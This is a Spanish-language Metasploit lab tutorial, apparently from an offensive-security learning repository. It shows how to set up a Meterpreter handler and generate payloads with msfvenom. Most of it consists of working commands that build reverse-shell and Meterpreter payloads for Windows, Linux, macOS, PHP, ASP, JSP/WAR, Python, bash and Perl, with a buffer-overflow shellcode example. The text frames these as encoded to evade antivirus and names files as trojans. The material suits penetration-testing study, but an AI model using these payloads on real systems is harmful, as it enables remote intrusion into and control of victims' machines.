# <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="llaves.png" width="4%">	Meterpreter 

> [!IMPORTANT]
> Laboratorio Meterpreter en <b>framework Metasploit</b> (Kali Linux 2023.4). Meterpreter (Meterpreter es el diminutivo para meta-interprete) es un payload que permite ejecutar tareas de forma remota en una máquina que se ejecuta en un nivel muy bajo de la máquina, por lo que es bastante difícil de detectar y, por tanto, muy útil para evadir sistemas antivirus, IDS o IPS. Gracias al payload Meterpreter, es posible realizar multitud de acciones sobre el sistema vulnerado, si bien no tiene porqué comportarse de la misma forma en todos los sistemas operativos. Este Payload que se ejecuta después del proceso de explotación o abuso de una vulnerabilidad en un sistema operativo, siempre en memoria, lo que evitará ser detectado.

> ### Trabajando con Meterpreter: MSFVenom y la generación de un Payload :computer:
> Con MSFVenom se simplifica la generación de payloads y los intentos de codificación de éstos, entre cuyas opciones podemos destacar: 
> - Payload, parámetro que especifica el payload que se utilizará.
> - Encoder, otro parámetro que especifica el algoritmo que se utilizará para realizar la codificación.
> - Format, donde se especifica el formato de salida del fichero (normalmente EXE, PY...)
> - Bad-chars, que indica un listado de bytes que no se deben generar en el proceso de obtención del payload (como por ejemplo, si se quieren evitar los bytes nulos '\x00' se añaden en la lista de este parámetro).
> - Iterations, que indica el número de iteraciones que se ejecutará el algoritmo del encoder (codificador)
> - Template, que permite elegir la plantilla de ejecutable que se utilizará.
> - Keep, que especifica que el payload se ejecutará en un thread (hilo) y no en el main del ejecutable, lo que produce un payload más sigiloso.


- <b>Paso 1</b>: Ya dentro de Metasploit Framework, se utilizará el exploit multi handler, payload que se utiliza para conectar con el objetivo. Dependiendo del tipo de payload, el handler queda a la espera (está en modo escucha) de una conexión por parte del payload cargado en el objetivo (reverse payload), llegando a iniciar una conexión contra el host y puertos objetivo en ciertos casos (bind payload). En la consola, se codifica:
<b>

```
use exploit/multi/handler
```
</b>

- <b>Paso 2</b>: Ahora, se procede a crear el payload como tal. La cuestión principal es para qué sistema operativo deberá estar preparado, tanto el tipo como la versión, arquitectura... ¡¡Todo con su máximo detalle!! Para ello, ejecutaremos <b>MSFVenom</b>, framework para Linux que combina la biblioteca de payloads y la de codificadores (encoders), de forma que permite generar un payload ofuscado (oculto a los sistemas antivirus y de protección) directamente. Para ello podemos consultar qué comandos tenemos disponibles:
<b>

```
msfvenom -h
```
</b>

Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
<b>

```
# Listado de payloads
msfvenom -l payloads
```

```
# Listado de opciones para payloads
msfvenom -p [payload_elegido] --list-options
```
</b>

- <b>Paso 3</b>: Se crea el payload con los parámetros necesarios para que sea efectivo y no detectado en el host objetivo:
<b>

```
msfvenom -p [payload_elegido] LHOST=[ip_atacante] LPORT=[puerto_escucha_atacante] -o [fichero_resultante]
```
</b>

Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
Así, podemos crear diversos tipos de payloads:
<b>

```
# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f exe > payload.exe
```
```
# En Java
msfvenom -p java/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f jar > payload.jar
```
```
# En python
msfvenom -p python/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.py
```
```
# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
```
```
# Para Linux
msfvenom -p linux/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
```
```
# Buffer Overflow en Linux - Shellcode
msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux 
--bad-chars "\x00\x09\x0a\x20" --out shellcode
```
</b>

<b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 
-f exe -o reverse_shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && 
echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

